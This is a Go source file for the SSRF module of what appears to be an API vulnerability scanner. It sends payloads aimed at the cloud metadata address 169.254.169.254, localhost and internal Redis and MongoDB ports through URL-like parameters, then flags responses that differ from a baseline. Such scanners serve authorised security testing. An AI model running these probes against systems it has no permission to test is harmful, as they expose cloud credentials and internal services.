package attacks

import (
	"apivapt/schema"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

var ssrfArgNames = []string{"url", "redirect", "src", "dest", "uri", "href", "callback", "proxy", "endpoint", "target", "path", "host"}

var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://127.0.0.1/",
	"http://localhost/",
	"http://127.0.0.1:6379/",
	"http://127.0.0.1:27017/",
}

func (s *SSRF) Run(endpoint schema.Endpoint, baseURL string) []schema.Findings {
	var findings []schema.Findings

	urlArgs := findURLArgs(endpoint.Args)
	if len(urlArgs) == 0 {
		return nil
	}

	for _, method := range endpoint.Methods {
		for _, argName := range urlArgs {
			baseline := doRequest(method, baseURL+endpoint.Path, argName, "http://example.com")
			if baseline == nil {
				continue
			}

			for _, payload := range ssrfPayloads {
				result := doRequest(method, baseURL+endpoint.Path, argName, payload)
				if result == nil {
					continue
				}

				if result.status != baseline.status || abs(result.bodyLen-baseline.bodyLen) > 50 {
					findings = append(findings, schema.Findings{
						Endpoint: endpoint.Path,
						Method:   method,
						Attack:   "SSRF",
						Severity: "high",
						Evidence: fmt.Sprintf("arg %q with payload %q — baseline %d/%d vs payload %d/%d",
							argName, payload,
							baseline.status, baseline.bodyLen,
							result.status, result.bodyLen),
						Request:  fmt.Sprintf("%s %s?%s=%s", method, baseURL+endpoint.Path, argName, payload),
						Response: result.body,
					})
				}
			}
		}
	}

	return findings
}

type response struct {
	status  int
	bodyLen int
	body    string
}

func doRequest(method, rawURL, argName, argValue string) *response {
	params := url.Values{}
	params.Set(argName, argValue)

	fullURL := rawURL + "?" + params.Encode()
	req, err := http.NewRequest(method, fullURL, nil)
	if err != nil {
		return nil
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2000))
	resp.Body.Close()

	return &response{status: resp.StatusCode, bodyLen: len(body), body: string(body)}
}

func findURLArgs(args map[string]schema.Arg) []string {
	var found []string
	for name := range args {
		lower := strings.ToLower(name)
		for _, keyword := range ssrfArgNames {
			if strings.Contains(lower, keyword) {
				found = append(found, name)
				break
			}
		}
	}
	return found
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}
